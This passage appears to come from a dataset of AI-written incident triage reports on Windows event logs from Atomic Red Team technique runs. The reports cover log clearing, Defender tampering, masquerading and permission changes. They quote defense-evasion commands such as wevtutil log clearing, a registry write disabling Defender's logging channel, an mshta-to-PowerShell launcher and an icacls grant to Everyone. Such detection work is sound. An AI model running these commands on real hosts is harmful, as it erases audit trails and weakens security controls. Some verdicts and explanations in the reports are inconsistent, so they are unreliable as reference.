     - Windows PowerShell log clearing is suggested by similar patterns in both Sysmon and System logs, though not explicitly captured here.
   - Log clearing without a legitimate need is a typical indicator of potential malicious activity, often used by threat actors to cover their tracks.

2. **Wevtutil Usage:**
   - Multiple instances of `wevtutil.exe` usage, executed by the user `admin_test` running with high integrity (as shown in the Sysmon logs).
   - The command lines used (e.g., `""C:\Windows\system32\wevtutil.exe"" cl Security`) indicate clearing of event logs. This corresponds with the log clearing events discussed.

3. **Command Execution with Anomalous Directory and File:**
   - A command was executed to start a document `Calculator.docx` located in a suspicious directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1221\src\Calculator.docx`.
   - The use of AtomicRedTeam is known for testing and simulating adversary behavior, but the nature suggests it could also be used for malicious actions or testing without proper authorization.
  
4. **Time of Events:**
   - All the suspicious activities, including log clearing and command executions, occurred within a very short timeframe, which could indicate a planned or automated attack scenario.

**Indicators of Malicious Activity or Compromise:**

- The combination of log clearing events (especially in critical logs like Security, System, and PowerShell) and the presence of `wevtutil.exe` for these actions implies an attempt to hide activities.
- The directories and file names used, such as in the context of AtomicRedTeam, suggest a potential simulation of attacks though could also signal real unauthorized activity.
  
### Assessment

Given the observed log clearing activities by the `admin_test` account using `wevtutil.exe`, coupled with the suspicious directory and file usage under test-like circumstances (AtomicRedTeam files), there is a substantial basis for raising these findings as suspicious. 

### Resolution: **SUSPICIOUS**

Given the suspicious indicators outlined:
- A full investigation is warranted to determine the intent behind these activities.
- Verify the legitimacy of the `admin_test` actions, including validating if these operations are part of authorized security tests.
- Ensure additional logging mechanisms are in place to track further suspicious activities, possibly including host-based intrusion detection systems (HIDS) or enhanced monitoring.
- Review and audit policies surrounding log management and systems administrative access to prevent unauthorized clearing of logs in the future.

Proceed swiftly with alerting relevant teams and securing the network to prevent potential further malicious activities."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"**Detailed Analysis of Logs:**

1. **Application Log:**
   - Essential events logged from `SecurityCenter` indicate that Windows Defender is operational (EventID 15 - `SECURITY_PRODUCT_STATE_ON`), which is expected behavior and not suspicious in itself.
   - The `edgeupdate` service starts and stops in quick succession. Rapid start/stop of services itself is not necessarily malicious but could be reviewed further for erratic behavior in conjunction with other indicators.

2. **Security Log:**
   - EventID 1102 indicates that security logs were cleared by the `admin_test` user. Log clearance is a red flag as it may indicate an attempt to hide illicit activity.
   - EventID 4624 for SYSTEM logon using `Advapi` and EventID 4672 indicates that SYSTEM privileges were granted. SYSTEM-level access is critical and should be scrutinized further.
   - `admin_test` account involvement in EventID 4798, listing user details, could be a part of normal operations but in conjunction with log clearance attempts, warrants further scrutiny.
   - Multiple EventID 5379 entries with return code `3221226021` (STATUS_SERVER_DISABLED) suggest failed attempts to access a credential that might not exist, which can be benign but should be correlated with other events like log clearance.
   
3. **Sysmon Log:**
   - Cmd.exe executed with suspicious command-line arguments: `""cmd.exe"" /c C:\\windows\\system32\\SyncAppvPublishingServer.vbs ""\n;Start-Process calc""`. This indicates a script execution followed by an execution concatenation `;`, suggestive of command injection or abuse (often a sign of exploit or malware).
   - Use of wevtutil.exe to clear event logs (`cl` flag) through several different channels (`Security`, `Application`, etc.). The execution of wevtutil is linked back to `admin_test`, indicative of log tampering attempts.
   - Use of `whoami.exe` and `hostname.exe` by `admin_test` prior to potential malicious commands could suggest reconnaissance activities.

4. **System Log:**
   - EventID 104 indicates that system logs were cleared by `admin_test`. This activity aligns with previous evidences of log tampering.
   - Evidence of Windows updates and Defender updates could suggest either legitimate system maintenance or attempts at system integrity actions after possible compromise.

**Assessment:**
The logs reveal a pattern where the `admin_test` account was used to perform potentially malicious actions: privileges were escalated, multiple logs were cleared, and suspicious PowerShell scripts executed. The absence of legitimate reasons for these activities alongside clearing of logs strongly suggests attempts to conceal malicious actions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:** Isolate the affected machine (Server002) from the network to prevent further unauthorized access.
- **Forensic Analysis:** Conduct a detailed forensic analysis focusing on the activities of `admin_test` and reviewing artifacts left by the `cmd.exe` and PowerShell command execution.
- **Credentials Review:** Review and rotate credentials, especially for administrative accounts.
- **Audit and Monitor:** Increase monitoring of log activities to detect further abnormalities.
- **Patch and Secure:** Ensure all systems and software are up-to-date to minimize exploitation through known vulnerabilities.
- **Policy Update:** Review and strengthen policies regarding administrative access and log management."
Disable Windows Notification Center,"Based on the provided Windows event logs, here's a comprehensive analysis of the situation:

1. **Clearing of Event Logs:**
   - The logs show consecutive events where the `wevtutil.exe` tool is used to clear several event logs (`Sysmon`, `Application`, `System`, `Security` and `Windows PowerShell` channels) by user `SERVER002\admin_test`.
   - The action of clearing event logs is highly suspicious, as it is often associated with malicious intent to cover tracks.

2. **Execution of System Utilities:**
   - The frequent invocation of `wevtutil.exe` for clearing logs and `whoami.exe` to check the logged-in user's identity further raise suspicions.
   - The commands executed with `wevtutil.exe` like `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, etc., indicate a deliberate attempt to delete logs from these specific channels.

3. **Registry Modification:**
   - There is an execution of the `cmd.exe` process with a command line argument modifying the Windows registry to disable the Notification Center: 
     ```
     ""cmd.exe"" /c reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
     ```
   - This behavior is suspicious as it alters system behavior and settings, potentially to avoid user notifications.

4. **Time Manipulation:**
   - There appears to be evidence of time manipulation with events showing changes in system time. This can be an attempt to manipulate timestamps to further obscure activities.

5. **Updates and Installations:**
   - Multiple processes related to Microsoft Edge Update are visible, indicating updates or installations. While these actions are generally benign when legitimate, in the context of other suspicious behavior like log clearing, it is worth a deeper analysis to ensure these updates aren't being used to mask malicious actions.

6. **Other Considerations:**
   - All activities are initiated by a high-integrity level user (`admin_test`), suggesting that privileged actions are being taken.

**Assessment Conclusion:**

- **Resolution: MALICIOUS**: 
  - The combination of event log clearing, registry modification, potential time manipulation, and usage of high-integrity level suggests that these actions are not typical for standard administrative behavior and are indicative of a security compromise.
  
**Guidance on How to Proceed:**
1. **Immediate Isolation:** 
   - Isolate `Server002` from the network to prevent further potential spread or connection with a command and control server.
   
2. **Detailed Forensic Analysis:**
   - Conduct a comprehensive forensic investigation of `Server002` to determine the extent of the compromise and identify any additional compromised systems.

3. **Review User Activities:**
   - Examine activities linked with the `admin_test` account broadly for unauthorized access patterns and ascertain whether credential misuse has occurred.

4. **Log Retention and Monitoring:**
   - Ensure that logging standards are reviewed, and logs are maintained securely with active monitoring for any future suspicious activity.
  
5. **Remediation Measures:**
   - Patch and update all software and review security policies to prevent similar future incidents. Reset any impacted credentials and strengthen network and endpoint defenses."

Mshta executes VBScript to execute malicious command,"### Analysis of Windows Event Logs:

#### Indicators of Malicious Activity:

1. **Event Log Clearing:**
   - Multiple instances of the `wevtutil.exe` process clearing various event logs, as seen through command lines like `""C:\Windows\system32\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `""Windows PowerShell""`.
   - Event ID `104` in the System log and Event ID `1102` in the Security log indicate the clearing of these logs. The `admin_test` user executed these actions, pointing towards a suspicious attempt to cover tracks or perform unauthorized activities.

2. **Unusual Command Execution:**
   - An instance of `cmd.exe` initiating a complex command to run a PowerShell script using `mshta` and `vbscript`. This is a commonly exploited technique for execution, seen in the command: `""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.005\\src\\powershell.ps1"""":close"")`.
   - This method is often used for obfuscation and stealthy execution of scripts, which is atypical for standard user activity.

3. **Potential Time Tampering:**
   - Sysmon log and Security log both contain time adjustments. Events 4616 indicate time changes by the system `svchost.exe` process, which can be an attempt to disrupt log event chronology to conceal malicious actions.

4. **High Integrity Operations by Non-Standard Users:**
   - The `admin_test` account consistently appears with a high integrity level across numerous actions which aren't standard operations for regular use, such as clearing logs or executing system utilities in rapid succession.

5. **Network Connection from Unknown Workstation:**
   - Event ID 4624 indicates a network logon by `admin_test` from an external IP address, with details hinting at a non-standard workstation `DESKTOP-3HL5B2P`. The use of NTLM for a network logon could potentially expose vulnerabilities.

#### Assessment:

The logs demonstrate suspicious activity characterized by the systematic clearing of logs using `wevtutil.exe`, usage of PowerShell scripts through obfuscated commands, possible manipulation of system time settings, and network logins from a potentially unauthorized workstation. The pattern of executing system utilities with high privileges indicates an attempt to perform these actions as unobtrusively as possible.

#### Conclusion:

Based on the sequence of events and the nature of the activities observed, it is safe to deduce that the operations exhibited in these logs are suspicious, with strong indicators of malicious intent potentially leading to unauthorized access, data tampering, or further system compromise.

Disable Arbitrary Security Windows Service,"Upon analyzing the provided Windows event logs, there are several indicators of potentially malicious activity that stand out:

1. **Sysmon Logs - Indicators of Log Clearing:**
   - Events indicate instances of `wevtutil.exe` being executed with command lines that suggest event log clearing. `wevtutil.exe` is being used with commands such as ""cl"", which stands for ""clear log"". The logs show commands targeting several log channels (e.g., Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell).
   - Event ID 5 in the logs shows processes like `wevtutil.exe` and `conhost.exe` being executed shortly after the log clearing commands.
   - This behavior is suspicious as it suggests an attempt to cover tracks by clearing logs which is often associated with malicious activity.

2. **Security and System Logs - LogFileCleared Events:**
   - System logs (Event ID 104) and Security logs (Event ID 1102) are showing events of log clearing by `admin_test`.
   - The log clearing coincides with the `wevtutil.exe` activities shown in Sysmon logs, reinforcing the suspicion of malicious intent.

3. **Potential Disablement of Security Tools:**
   - A `cmd.exe` process was observed executing command to stop and disable `McAfeeDLPAgentService` using `net.exe` and `sc.exe` command line tools.
   - Disabling security tools and services, particularly Data Loss Prevention (DLP) services, is a common tactic used in malware or penetration testing frameworks to avoid detection.

4. **Integrity Level and User Account:**
   - High integrity level is observed for processes executed by `admin_test`, indicating administrative privileges were used during these operations.
   - The user account `admin_test` is performing administrative actions such as modifying security services and clearing logs, which is suspicious unless explicitly authorized.

**Assessment of the Situation:**
- The logs demonstrate a set of activities that are commonly associated with attempts to hide malicious operations. The combination of clearing logs immediately following administrative operations, including potentially disabling security mechanisms, points to a highly suspicious intent.

**Resolution: MALICIOUS**
- Given the nature of the activities, namely the clearing of logs, and potentially disabling security services using an administrative account, the conclusion of this analysis is that the activities observed are malicious.

**Guidance on How to Proceed:**
- Immediate action should be taken to isolate the affected system (Server002) to prevent further unauthorized access or damage.
- Conduct a thorough review of the user account `admin_test` to understand the scope of unauthorized access and whether it was compromised or being used maliciously by a legitimate user.
- Restore any security tools or services that were stopped or disabled.
- Perform a forensic investigation on Server002 to identify any other potential compromises or backdoors.
- Review network traffic logs around the time of the incident for any indicators of data exfiltration or malicious communication.
- Enhance monitoring across similar systems within the network for similar indicators of compromise.
- If applicable, consider notifying relevant stakeholders and preparing a communication plan for both internal and external parties, especially if data was compromised."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"In reviewing the provided logs from the Windows host, several key observations indicate potentially suspicious and possibly malicious activities:

1. **Log Clearing Events:**
   - Several instances of `wevtutil.exe` being used to clear various system logs (event IDs: 104 and 1102). The clearing of logs is a significant red flag, as this is a common tactic used by attackers to cover their tracks (anti-forensics).
   - Specifically, the logs show evidence of the ""System"", ""Windows PowerShell"", and ""Security"" channels being cleared by the same user, `admin_test`.

2. **Suspicious PowerShell Activity:**
   - A PowerShell command executed to modify registry settings related to Windows Defender logging (disabling the operational log channel): `powershell.exe & {New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -PropertyType DWord -Value 0 -Force}`.
   - Such command-line arguments indicate an attempt to disable security features, which are very common in malware activities.

3. **Patterns in Process Creation:**
   - Numerous instances of the `wevtutil.exe` followed by `conhost.exe` in high-integrity levels being executed by `admin_test`, show a pattern of attempts to manipulate or clear logs repeatedly.
   - Repeated executions of `whoami.exe`, potentially to verify the privilege escalation, are often seen in post-exploitation activities.

4. **Windows Time Manipulation:**
   - Event logs show alterations of system time (event ID: 4616), which can be suspicious if correlated with other activities aimed to confuse logs' chronological order.

5. **Edge Update Program Execution:**
   - Multiple entries related to `MicrosoftEdgeUpdate.exe` involve system-level processes. While these updates can be legitimate, the extensive number and sequence suggest a potential misuse or a possible disguise under known applications/services, although no further indicators confirm it to be malicious in context directly.

**Assessment and Threats Identified:**
- The combination of log clearance, PowerShell abuse, and other suspicious patterns, especially disabling security monitoring and clearing of important logs such as Security, System, and Windows PowerShell, collectively point towards malicious activities. These actions likely link to an intrusion incident potentially involving privilege escalation and lateral movement attempts, possibly with a goal to conduct further malicious actions undetected.

**Guidance on Proceeding:**
1. Immediately isolate the affected host (`Server002`) from the network to prevent further spread or data exfiltration.
2. Conduct a thorough forensic analysis to determine how the compromise occurred and assess the extent of damage or exfiltration.
3. Review user account activities, especially for `admin_test`, and reset credentials as a precaution.
4. Restore cleared logs from backup if possible and investigate any corresponding activities leading up to the event time of these logs.
5. Re-enable any disabled security features and consider implementing stricter logging and monitoring solutions.
6. Work with your incident response team to plan and mitigate similar threats in the future and improve your defense mechanisms.

**Resolution: MALICIOUS**   
This conclusion stems from the combination of behaviors observed—log clearance, disabling security monitoring, and advanced persistence or escalation techniques indicating deliberate and potentially malicious intent. The actions conform to an attack pattern aiming for stealthy system changes and misconfiguration for future exploitation."
DLL Side-Loading using the dotnet startup hook environment variable,"Upon reviewing the provided logs, several key points emerge that indicate potentially suspicious behavior:

### Summary of Findings:

1. **Event Log Clearing**:
    - Multiple log clearing events are observed, particularly regarding the `Security`, `System`, and `Windows PowerShell` event channels. This activity could indicate an attempt to cover tracks or hide activities:
      - **Security Log**: EventID 1102 indicates the security logs were cleared by the user `SERVER002\\admin_test`.
      - **System Log**: Similar log-clearing actions.
      - **PowerShell Log**: Also cleared.
    - Log clearing, especially without a legitimate reason, is often considered a red flag for malicious intent.

2. **Suspicious PowerShell Activity**:
    - **Sysmon Log**: Executes `wevtutil.exe` with the command `cl Microsoft-Windows-Sysmon/Operational`, indicating an attempt to clear Sysmon logs, which could further indicate malicious activities being hidden.

3. **Command Execution**:
    - Execution of `cmd.exe` with parameters to modify the `DOTNET_STARTUP_HOOKS`, which can be used to inject a DLL into .NET applications. This is notably suspicious as it involves the potential execution of an unauthorized DLL (e.g., preloader.dll as seen in the logs).
    - Usage of `whoami.exe` and `hostname.exe` within the same timeframe as the other suspicious activities, often part of reconnaissance or script automation.

4. **Tools Possibly Used by Attackers**:
    - **EDR Alerts on CEO's Machine**: Given this investigation pertains to the CEO's machine, any manipulation involving startup hooks or clearing of various logs should be considered sensitive and a cause for further investigation.
    - Presence of temporary directory paths and execution linked to Atomics Red Team exercises may suggest an emulation of adversary tactics for testing, although unauthorized testing should also be flagged.

### Assessment and Resolution:
Given the indicators—event log clearance, suspicious execution of cmd and PowerShell commands, use of utility software for likely reconnaissance—it is most reasonable to classify these activities as **Suspicious**. There are hallmarks of malicious intent aimed at avoiding detection, suggesting the potential for or existence of compromise.

### Guidance on How to Proceed:
1. **Immediate Measures**:
   - Increase monitoring on the CEO's machine and associated network traffic for unusual activities.
   - Validate the account `SERVER002\admin_test`. Ensure it is a legitimate account, investigate possible misuse and enforce MFA if not already in place.
   - Conduct a full security audit on the system, including scanning for malware or unauthorized changes to system files and configurations.

2. **Detailed Investigation**:
   - Collect and analyze more log data, especially prior to the log clearing timestamps, if possible, to determine what activities were possibly concealed.
   - Review command history, especially around executed commands using suspicious arguments and contexts (e.g., DOTNET_STARTUP_HOOKS).

3. **Check for Legitimate Approval**:
   - Confirm if the execution related to the Atomic Red Team exercises or other testing scenarios had valid approvals from the security team.

A resolution classification of **SUSPICIOUS** is given based on the analysis, with further investigation required to confirm or deny these suspicions, potentially leading to a **MALICIOUS** resolution if findings corroborate an actual compromise."
Malicious process Masquerading as LSM.exe,"Based on the analysis of the provided event logs, the following observations have been made:

### Observations:

1. **Clearing of Event Logs:**
   - **Event ID 1102:** An event ""The audit log was cleared"" suggests that someone cleared the Windows security log. This action can indicate an attempt to cover tracks after illicit activities. The logs indicate this action was performed by a user account named `admin_test` on `Server002`.
   
2. **Use of `wevtutil.exe`:**
   - The command-line utility `wevtutil.exe` is extensively used for clearing logs from various event channels like Microsoft-Windows-Sysmon/Operational, System, Application, and Windows PowerShell. This is suspicious as it indicates intentional log clearance, possibly to hide malicious activities.

3. **Multiple Credential Reading Failures:**
   - **Event ID 5379:** Multiple failed attempts to read credentials are recorded. These attempts from a system context (S-1-5-18) with `Return Code` 3221226021 (STATUS_DAC_NOT_GRANTED) suggest unauthorized attempts to access sensitive information.

4. **Suspicious Command Execution:**
   - **Cmd.exe and lsm.exe:** The creation and execution of `lsm.exe` is suspicious. `lsm.exe` is typically a legitimate service, but in this context, it is copying `cmd.exe` and running it with another name, which is typical of masquerading to evade detection.
   - The command executed `\""cmd.exe\"" /c copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe` indicates possible malicious intent by obfuscating `cmd.exe` operations.

5. **High Integrity Level Processes:**
   - Several processes such as `cmd.exe`, `wevtutil.exe`, and `whoami.exe` are run at a high integrity level by user `SERVER002\\admin_test`, which signifies these programs were executed with administrative privileges.

### Assessment:

Considering the combination of log clearance activities, unauthorized attempts to access credentials, and suspicious process execution using common obfuscation techniques, all conducted under a privileged account, these logs indicate:

- **Potential Log Tampering** and **Indication of Intrusion**: The actions observed are typically aligned with common techniques used in an intrusion scenario to hide evidence of unauthorized activities.

### Resolution:

- **MALICIOUS**: The activities recorded in the logs signify clear malicious intent, particularly focusing on hiding activities through log clearance and unauthorized credential access attempts.

Flush Shimcache,"Upon reviewing the provided Windows event logs, I noticed several activities that are indicative of potentially malicious behavior:

1. **Event Log Clearing:**
   - The security log shows event ID 1102, which indicates that the security log was cleared by a user ""admin_test"". This action is often associated with attempts to cover tracks in a system.
   - System log entries with event ID 104 also showing cleared logs for various channels including System and Windows PowerShell.

2. **Use of wevtutil.exe:**
   - The Sysmon logs show multiple executions of the ""wevtutil.exe"" process with parameters to clear logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl ""Windows PowerShell""`). 
   - These actions are performed by the ""admin_test"" user with high integrity level, indicating administrative privileges.
   - The `wevtutil.exe` utility is a legitimate Windows tool used to manage event logs, but its use to clear logs corresponds with the suspicious log clearing activity.

3. **Suspicious Command Execution:**
   - The execution of `cmd.exe` with a command line involving `rundll32.exe` seen in the Sysmon events suggests potentially suspicious activity, especially with ShimFlushCache functionality. This could indicate a programmatic execution that might be used to execute malicious actions covertly.

4. **Time Changed Events:**
   - The security and system logs show entries related to changes in the system time. These might be non-malicious but can indicate attempts to manipulate log timestamps.

5. **No Benign Explanation Provided:** 
   - No benign applications or update processes appear in these logs to account for such modifications to event logs or cryptic command execution patterns.

**Assessment and Recommendations:**
The actions performed by the `admin_test` user, including the clearing of the event logs and the use of a command line to execute `wevtutil.exe` multiple times to clear different logs, strongly align with attempts to obfuscate activities on the machine, suggesting malicious intent. Furthermore, the execution of suspicious command lines (`rundll32.exe`) that can be indicative of possible malware behavior further points towards compromise.

Recommended Actions:
- Immediately isolate the affected machine to prevent further potential exfiltration or lateral movement.
- Perform a comprehensive forensic analysis on the affected system, including memory and disk images, to identify any malware.
- Reset credentials for the involved user accounts and investigate any unauthorized access.
- Review recent changes or installations in the system that could provide additional insights into the infiltration vector.
- Consider coordination with legal or incident response teams if data breach or unauthorized access is confirmed.

**Resolution: MALICIOUS**
The logs contain evidence of malicious activity, specifically efforts to clear security-related logs potentially to disguise unauthorized or harmful actions carried out on the system."
Terminal Server Client Connection History Cleared,"### Detailed Analysis:
Upon reviewing the log entries provided, there are some significant indicators of probable malicious activity:

1. **Event Log Clearing Activity:**
   - **System and Security Event Logs Clearing:** The log entries indicate system log and security log clearance (Event ID 104 in system log and Event ID 1102 in the security log) by a user identified as `admin_test`. This is a strong indicator of malicious activity, as attackers often attempt to clear logs to cover their tracks after gaining unauthorized access.
   - Both actions occurred very closely in time, pointing to a coordinated action potentially to hide traces of other simultaneous activities.

2. **Suspicious Use of `wevtutil`:**
   - `wevtutil.exe` is used multiple times (`EventID 1` in Sysmon log) by `admin_test`. It is running commands that suggest the clearing of Windows event logs (""cl Application"", ""cl System"", ""cl Security""), consistent with attempts to erase evidence.

3. **Registry Manipulation:**
   - There are events related to registry entries being deleted (`reg.exe` usage under `cmd.exe` with CommandLine showing deletion of registry keys related to the Remote Desktop Protocol). Removing RDP related keys might be an attempt to disrupt RDP connections or remove traces tied to RDP use.

4. **Unusual Command Line Activity:**
   - The frequent and unusual command-line activity for critical system utilities (`cmd.exe`) involving registry modification and event log clearance without legitimate purpose is a red flag for malicious use.
   
5. **High Privilege Operations with `Admin_Test`:**
   - Consistent use of high privilege ID, namely `admin_test`, in performing these operations suggests either an insider threat or compromised administrative credentials.

6. **Execution Patterns:**
   - The pattern of executions based on timing and involved processes (PowerShell, wevtutil, etc.) is non-typical for usual administrative tasks. Especially the rapid execution and toolset being employed align with known hacking activities.

### Assessment:
The logs reveal indicators consistent with potential unauthorized access and malicious intent, primarily driven by log clearing activities, suspicious command executions (including PowerShell and wevtutil), and registry key manipulations.

### Guidance and Resolution:
- **Resolution: MALICIOUS**
  - Given the evidence of event log clearing, suspicious use of system utilities for potentially disruptive or cover-tracing actions, and high privilege account usage, these activities strongly suggest a compromise.
  
- **Immediate Steps:**
  - **Isolate the Affected System:** To prevent further unauthorized access or potential lateral movement by the threat actor.
  - **Conduct a Comprehensive Review:** Gather additional logs for any remote access events and cross-reference for unauthorized logins or anomalies from other host logs.
  - **Credential Audit:** Reset passwords and review permissions, especially for `admin_test` to ensure there are no residual accesses.
  - **Conduct Incident Response:** Engage with a full incident investigation team to further analyze and resolve any potential intrusions.
  - **Strengthen Monitoring:** Implement enhanced monitoring with alert configurations focusing on command line executions, registry edits, and log-clearing attempts.

By addressing these actions promptly, further security breaches can be mitigated and future attacks deterred."
Running DLL with .init extension and function,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity. Here's a detailed analysis:

### Analysis:

1. **Event Logs Cleared**:
   - **System Log (Event ID 104)**:
     - The log indicates that the logs for both the System and Windows PowerShell channels were cleared by the user `admin_test`.
     - **Security Log (Event ID 1102)**:
       - This event indicates that the security logs were cleared, which is a well-known indicator of log tampering to cover tracks.

   The clearing of these logs suggests an attempt to hide activities that occurred on `Server002`.

2. **Process Execution**:
   - Multiple instances of `wevtutil.exe` executed with the command line to clear various event logs, as indicated by Event ID 1 in the Sysmon logs. The command line used was:
     ```plaintext
     ""C:\Windows\system32\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational
     ```
     This was conducted by the user `admin_test` with high integrity level, indicating elevated privileges.
   
3. **Suspicious PowerShell Activity**:
   - **Windows PowerShell Log (Event ID 600)**:
     - The logs show the execution of `rundll32.exe` with a script from a path resembling known red team or attack simulation tools:
       ```
       C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\bin\_WT.init,krnl
       ```
     - This is characteristic of TTPs (Tactics, Techniques, and Procedures) used in malware or penetration testing exercises.

4. **Potential Command and Control Setup**:
   - The use of `rundll32.exe` with an unclear command execution pattern suggests possible exploitation of Windows binaries to execute code in the context of the current user. `rundll32.exe` is known for being used in living-off-the-land binaries (LoLBins) attacks, where legitimate Windows utilities are used for malicious purposes.

### Assessment:

The combination of these patterns—log clearing, unorthodox PowerShell usage, and the specific use of `rundll32.exe`—strongly indicates malicious activity. The logs suggest potential compromise and efforts to obfuscate attacker activities.

### Resolution: **MALICIOUS**

Based on the evidence from the logs, the activities logged are indicative of malicious activity. Immediate steps should be taken to contain the situation and to investigate further:

### Guidance:

1. **Isolation**: Immediately isolate Server002 from the network to prevent any further potential exfiltration or lateral movement.
2. **Memory Analysis**: Perform memory forensics to understand running processes and potential malicious code that might reside in memory.
3. **Review User Accounts**: Investigate the `admin_test` user account for unauthorized access or privilege escalation.
4. **File Integrity and Threat Hunting**: Use file integrity monitoring and conduct a thorough threat hunt on the system for any remnants of the suspected `AtomicRedTeam` or other similar TTPs.
5. **Rebuild System**: If compromise is confirmed and persistent, consider wiping and rebuilding the system from a known clean state.
6. **Logging and Monitoring**: Ensure proper logging and monitoring are in place moving forward to detect similar activities in the future."
Execution from Compressed JScript File,"Upon inspection of the provided Windows event logs, several activities raise concerns regarding potential malicious behavior. Here's a detailed analysis:

### Suspicious and Anomalous Behaviors:

1. **Event Log Clearance**: The logs indicate multiple instances of event log clearance:
   - **System Event ID 104**: Logs are cleared for the ""System"" and ""Windows PowerShell"" channels by the user `admin_test`.
   - **Security Event ID 1102**: The security log was cleared by the same user.
   - **Sysmon Events**: Several occurrences of `wevtutil.exe` processes are clearing logs for different channels (Microsoft-Windows-Sysmon/Operational, Application, and Security).

   These actions are highly suspicious as clearing event logs can indicate an attempt to hide malicious activities.

2. **Suspicious Process Executions**:
   - **Execution of JavaScript via Command Prompt**: The logs show execution of a JavaScript file (`T1027js.js`) from a temporary directory using `cmd.exe`, which is unusual and indicative of potential execution of harmful scripts.
   - **Execution of `wscript.exe`**: This is known scripting host for running scripts, used in line with the suspicious JS file.
   - **Usage of `whoami.exe` and `hostname.exe`**: These could indicate recon activity, attempting to gather system information post-compromise.

3. **Use of Known Dual-Use Tools**: 
   - **`wevtutil.exe`**: Commonly used for legitimate purposes but often leveraged by attackers for clearing event logs as seen here.
   - **`cmd.exe` and `conhost.exe`**: In themselves not malicious but their usage context here reflects script execution which is unusual and suggestive of evasive activities.

4. **Timing and Sequence of Events**: The series of log clearances and process executions occur within a very short timeframe. This aligns with an attempt to execute a malicious payload and erase tracks quickly.

### Conclusion:

In conclusion, the presence of log clearances, especially in rapid succession, coupled with the execution of potentially harmful scripts like the JS file, and common reconnaissance commands, increases the risk of this host being compromised. The activities align with typical stages of a malware attack: execution, persistence, and cover-up.

### Resolution:

**MALICIOUS**: The evidence found in the logs is consistent with malicious activity. Immediate steps should be taken to investigate further, such as:
- Conducting a full malware scan on the machine.
- Checking for other signs of compromise across the network.

By following the above steps, the integrity of the system can be restored and similar threats might be prevented in the future."
Event Log Manipulations- Time slipping via Powershell,"Upon reviewing the provided event logs from the Windows system, several indicators suggest potentially malicious activity:

1. **Wevtutil Usage**:
   - Multiple Sysmon EventID 1 logs indicate usage of `wevtutil.exe` to clear event logs (`CommandLine` examples: `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, etc.). This is often associated with attempts to remove traces of activity from a system to avoid detection.

2. **Privileged User Execution**:
   - The user `SERVER002\\admin_test` has been executing commands with high integrity level (`High`). This user context is used during log clearing actions.

3. **Time Manipulation**:
   - Security logs (EventID 4616) reveal that the system time was tampered with using PowerShell commands (`Set-Date -Date (Get-Date).AddDays(3)`). Such time manipulation can be part of an effort to confuse logging/forensic timelines or could be related to persistence mechanisms or evading temporal-based detection systems.

4. **Suspicious PowerShell Activity**:
   - The command executed via PowerShell attempts to create a file (`Add-Content ""$env:APPDATA\\slipDays.bak"" 3`). This is not inherently malicious but coupled with the context of time manipulation suggests it could be part of a malicious script.

5. **Events Log Clearance**:
   - System logs (EventID 104) and Security logs (EventID 1102) indicate that event logs for system, security, and PowerShell channels were cleared, which is a strong indication of malicious intent, as this is a common tactic to hide evidence of other malicious actions.

6. **Elevated Privileges**:
   - Numerous privilege escalation events (Security EventID 4672) were recorded involving `admin_test`, emphasizing that the actions performed had administrative access and high-level privileges were utilized.

**Assessment and Threat**:
- There is a pattern of suspicious activities that include log clearing, power shell command execution with time manipulation, and elevated privileges usage, all of which indicate an attempt to mask illicit activities or unauthorized access/changes within the system. These activities are characteristic of attackers trying to hide their tracks or prepare a system for further exploitation or persistent access.

Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"### Detailed Analysis:

Upon reviewing the logs provided, several observations and potentially suspicious activities were identified. The following is an analysis based on these logs:

1. **Edge Update Activity**: 
   - The logs indicate multiple invocations of `MicrosoftEdgeUpdate.exe` and related components. The activity spans multiple process executions and appears to be a legitimate software update cycle for Microsoft Edge. This behavior can be considered normal as part of automated update processes.

2. **Suspicious Command Execution**:
   - `cmd.exe` executed with the command line argument `icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q` was observed. Granting 'Everyone' full control over files or directories is a significant security risk, as it allows unrestricted access to all users, including potential malicious actors, on sensitive directories.

3. **Event Log Clearing**:
   - The security logs show that the event logs were cleared by the user `admin_test`. This is indicated by Event ID `1102` in the Security log, which explicitly states that the logs were cleared by `admin_test`. The clearing of logs can be a red flag, as it may be an attempt to cover tracks after malicious activity.

4. **Sysmon Logging**:
   - Multiple process creations using `wevtutil.exe` were observed, suggesting actions related to event log management. `wevtutil.exe` is a legitimate Windows utility used to manage event logs, but it is being executed frequently.

5. **Time Manipulation**:
   - The Security and System logs contain Event ID `4616`, which indicate a change in system time. This can be part of normal operations but, combined with the clearing of logs, might suggest an attempt to manipulate logs or event timelines.
   
#### Conclusion:

- **Threats and Risks Identified**:
  - Execution of commands that modify file permissions to a universally open state is dangerous.
  - Clearing of Security and System event logs is indicative of malicious intent or an attempt to erase tracks of potentially harmful actions.
  
- **Guidance on How to Proceed**:
  - Immediately restrict access to the system and investigate `admin_test` user activities. Check if the 'admin_test' account is necessary or if it was potentially compromised.
  - Review permission changes on files and directories modified by the `icacls` command.
  - Conduct a full security audit to determine if unauthorized changes were made.
  - Ensure that system patches and security updates are applied to safeguard against vulnerabilities.
  - Consider resetting the affected passwords and possibly reimaging the system if further compromise is detected.

### Resolution:

